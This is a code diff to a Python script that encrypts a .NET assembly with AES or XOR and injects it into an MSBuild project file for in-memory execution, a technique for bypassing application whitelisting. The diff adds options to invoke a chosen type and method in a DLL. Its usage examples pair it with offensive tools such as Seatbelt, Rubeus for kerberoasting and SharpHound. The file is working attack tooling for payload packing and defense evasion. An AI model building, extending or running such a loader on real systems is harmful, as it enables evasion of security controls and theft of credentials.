@@ -5,14 +5,16 @@ build_msbuild.py -- Encrypts a .NET assembly and injects into msbuild_payload.cs
 Usage:
   python build_msbuild.py <assembly_path> [options] [-- <assembly_args>...]
 
-  Everything after -- is passed as arguments to the loaded assembly's Main().
+  Everything after -- is passed as arguments to the loaded assembly's Main()
+  or to the target method if --type/--method are specified.
 
 Examples:
   python build_msbuild.py Seatbelt.exe -- -group=all
   python build_msbuild.py Seatbelt.exe -e xor -- -group=all
   python build_msbuild.py Rubeus.exe -e aes -- kerberoast
   python build_msbuild.py SharpHound.exe -o ready.csproj -- -c All
-  python build_msbuild.py Seatbelt.exe --key <64-hex> --iv <32-hex>
+  python build_msbuild.py MyDll.dll --type Namespace.Class --method Run
+  python build_msbuild.py MyDll.dll --type Namespace.Class --method Execute -- arg1 arg2
 """
 
 import argparse
@@ -110,7 +112,7 @@ def main():
     parser = argparse.ArgumentParser(
         description="Encrypt a .NET assembly and inject into msbuild_payload.csproj"
     )
-    parser.add_argument("assembly", help="Path to .NET assembly to encrypt")
+    parser.add_argument("assembly", help="Path to .NET assembly (.exe or .dll)")
     parser.add_argument(
         "-e", "--encryption", choices=["aes", "xor"], default="aes",
         help="Encryption method: aes (AES-256-CBC, default) or xor"
@@ -121,9 +123,22 @@ def main():
     parser.add_argument(
         "--iv", help="AES IV as hex (16 bytes / 32 hex chars, ignored with -e xor)"
     )
+    parser.add_argument(
+        "--type",
+        help="Fully qualified type name to invoke (e.g. Namespace.Class). Required for DLLs without an entry point."
+    )
+    parser.add_argument(
+        "--method",
+        help="Method name to invoke on --type (e.g. Execute). Required with --type."
+    )
     parser.add_argument("-o", "--output", help="Output file (default: msbuild_ready.csproj)")
     parser.add_argument("--template", help="Template csproj (default: msbuild_payload.csproj)")
     args = parser.parse_args(argv)
+
+    # Validate --type and --method are used together
+    if (args.type is None) != (args.method is None):
+        print("[-] --type and --method must be specified together.", file=sys.stderr)
+        sys.exit(1)
 
     script_dir = os.path.dirname(os.path.abspath(__file__))
     template_path = args.template or os.path.join(script_dir, "msbuild_payload.csproj")
@@ -143,6 +158,8 @@ def main():
 
     with open(template_path, "r") as f:
         template = f.read()
+
+    # --- Encryption ---
 
     if args.encryption == "xor":
         if args.key:
@@ -202,7 +219,19 @@ def main():
 
     print(f"[*] Encrypted payload: {len(encrypted_b64)} chars base64", file=sys.stderr)
 
-    # Replace args placeholder
+    # --- Invocation target ---
+
+    if args.type and args.method:
+        template = template.replace('"YOURTYPEHERE"', f'"{args.type}"')
+        template = template.replace('"YOURMETHODHERE"', f'"{args.method}"')
+        print(f"[*] Target: {args.type}.{args.method}()", file=sys.stderr)
+    else:
+        template = template.replace('"YOURTYPEHERE"', '""')
+        template = template.replace('"YOURMETHODHERE"', '""')
+        print(f"[*] Target: EntryPoint (auto)", file=sys.stderr)
+
+    # --- Assembly args ---
+
     if assembly_args:
         args_lines = []
         for arg in assembly_args:
